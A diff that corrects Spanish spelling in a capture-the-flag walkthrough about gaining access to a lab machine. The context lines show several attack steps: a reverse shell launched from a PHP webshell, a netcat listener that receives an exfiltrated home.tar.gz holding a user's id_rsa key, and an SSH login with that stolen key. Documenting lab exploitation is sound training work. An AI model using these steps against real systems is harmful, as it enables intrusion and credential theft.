@@ -1,4 +1,4 @@
-## Vuln exploit & Gaining Access {-}
+## Explotacion de vulnerabilidad & Ganando Acceso {-}
 
 ### Crear una reverse shell desde la s4vishell.php con un index.html {-}
 
@@ -47,7 +47,7 @@ stty -a
 stty rows <rownb> columns <colnb>
 ```
 
-### Inverstigamos la maquina {-}
+### Investigamos la maquina {-}
 
 ```bash
 ls -l
@@ -57,11 +57,11 @@ cd noah/
 cat user.txt
 ```
 
-Permission denied. Nos tenemos que passar al usuario Noah
+Permission denied. Nos tenemos que pasar al usuario Noah
 
 ### User Pivoting al usuario noah {-}
 
-#### Analyzamos el systema {-}
+#### Analizamos el systema {-}
 
 ```bash
 id
@@ -72,7 +72,7 @@ cat /etc/crontab
 ls -l /var/spool/cron
 ```
 
-No vemos nada. Tendremos que passar por el systema web
+No vemos nada. Tendremos que pasar por el sistema web
 
 ```bash
 cd /var
@@ -91,7 +91,7 @@ cd /var
 find \-type f 2>/dev/null | grep -v -E "lib|cache"
 ```
 
-Aqui vemos algo que podria ser interressante.
+Aqui vemos algo que podria ser interesante.
 
 ```bash
 cd /var/backups
@@ -102,7 +102,7 @@ Vemos un `home.tar.gz` y tenemos derecho de visualizar
 
 #### Nos enviamos el home.tar.gz {-}
 
-1. En la maquina de attackante
+1. En la maquina de atacante
 
     ```bash
     nc -nlvp 443 > home.tar.gz
@@ -123,7 +123,7 @@ Vemos un `home.tar.gz` y tenemos derecho de visualizar
 
 Ya podemos ver que es un comprimido del directorio home del usuario Noah con authorized_key y una id_rsa del proprio usuario
 
-### Conneccion por ssh {-}
+### Conexion por ssh {-}
 
 ```bash
 chmod 600 id_rsa
